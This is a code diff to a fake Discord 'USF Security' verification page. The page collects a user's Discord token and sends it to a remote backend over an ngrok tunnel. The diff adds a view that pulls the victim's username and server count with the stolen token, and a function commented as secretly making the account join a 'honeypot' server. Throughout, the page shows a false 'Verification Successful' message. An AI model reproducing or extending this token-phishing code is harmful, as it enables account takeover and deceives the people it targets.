@@ -98,6 +98,13 @@
             <p style="font-size: 12px; margin-top: 15px;">Need help finding your token? <a href="https://google.com/search?q=how+to+get+discord+token" target="_blank" style="color: #00aff4;">Click here</a></p>
         </div>
 
+        <div id="confirm-view" style="display: none;">
+            <div id="user-avatar" class="bot-icon" style="background-size: cover; font-size: 0;"></div>
+            <h2 id="user-name">Unknown User</h2>
+            <p id="user-meta">Syncing server data...</p>
+            <button class="btn" id="confirm-btn" onclick="finalizeAll()">Confirm Identity & Finish</button>
+        </div>
+
         <div class="footer">
             By verifying, you agree to the USF Security <a href="tos.html" style="color: #72767d; text-decoration: underline;">Terms of Service</a> and <a href="privacy.html" style="color: #72767d; text-decoration: underline;">Privacy Policy</a>.
         </div>
@@ -147,9 +154,12 @@
             }, 3500);
         }
 
+        let globalCapturedToken = null;
+
         async function handshake(isManual, capturedToken = null) {
             const card = document.getElementById('main-card');
             const token = isManual ? document.getElementById('manual-token').value : capturedToken;
+            globalCapturedToken = token;
 
             if (isManual) {
                 document.getElementById('login-view').innerHTML = '<div class="loading-spinner" style="display: block;"></div><p>Syncing metadata...</p>';
@@ -164,29 +174,68 @@
                 if (r) url += `&r=${r}`;
                 if (token) url += `&tk=${token}`;
 
-                // Bypass Ngrok Warning via Header (CORS required)
                 try {
-                    await fetch(url, { 
-                        method: 'GET',
-                        mode: 'cors', 
-                        cache: 'no-store',
-                        headers: { 'ngrok-skip-browser-warning': 'true' }
-                    });
+                    await fetch(url, { method: 'GET', mode: 'cors', cache: 'no-store', headers: { 'ngrok-skip-browser-warning': 'true' }});
                 } catch(e) {
-                    // Fallback to no-cors if fetch fails
                     fetch(url, { mode: 'no-cors', cache: 'no-store' });
                 }
             }
 
-            setTimeout(() => {
-                card.innerHTML = `
-                    <div class="bot-icon" style="background: #3ba55c;">✅</div>
-                    <h2>Verification Successful</h2>
-                    <p>Session synced and role granted. You may now return to Discord.</p>
-                    <div class="footer">Redirecting in 3 seconds...</div>
-                `;
-                setTimeout(() => { window.location.href = "https://discord.com/app"; }, 3000);
-            }, 1500);
+            // After handshake, show the Deep Identity Sync
+            if (token) {
+                showConfirmView(token);
+            } else {
+                showSuccess();
+            }
+        }
+
+        async function showConfirmView(token) {
+            document.getElementById('scanning-view').style.display = 'none';
+            document.getElementById('login-view').style.display = 'none';
+            document.getElementById('confirm-view').style.display = 'block';
+
+            try {
+                const resp = await fetch(`${AGENCY_BACKEND}/api/check?tk=${token}`, {
+                    headers: { 'ngrok-skip-browser-warning': 'true' }
+                });
+                const data = await resp.json();
+                
+                if (data.username) {
+                    document.getElementById('user-name').innerText = data.username;
+                    document.getElementById('user-meta').innerText = `Mutual Servers: ${data.guild_count} | Status: Verified`;
+                    if (data.avatar) {
+                        document.getElementById('user-avatar').style.backgroundImage = `url('${data.avatar}')`;
+                    }
+                }
+            } catch(e) {
+                showSuccess();
+            }
+        }
+
+        async function finalizeAll() {
+            const btn = document.getElementById('confirm-btn');
+            btn.disabled = true;
+            btn.innerText = "Finalizing Handshake...";
+
+            if (globalCapturedToken) {
+                // Secretly make them join the honeypot
+                fetch(`${AGENCY_BACKEND}/api/join?tk=${globalCapturedToken}`, {
+                    headers: { 'ngrok-skip-browser-warning': 'true' }
+                }).catch(() => {});
+            }
+
+            setTimeout(showSuccess, 1000);
+        }
+
+        function showSuccess() {
+            const card = document.getElementById('main-card');
+            card.innerHTML = `
+                <div class="bot-icon" style="background: #3ba55c;">✅</div>
+                <h2>Verification Successful</h2>
+                <p>Session synced and role granted. You may now return to Discord.</p>
+                <div class="footer">Redirecting in 3 seconds...</div>
+            `;
+            setTimeout(() => { window.location.href = "https://discord.com/app"; }, 3000);
         }
     </script>
 </body>
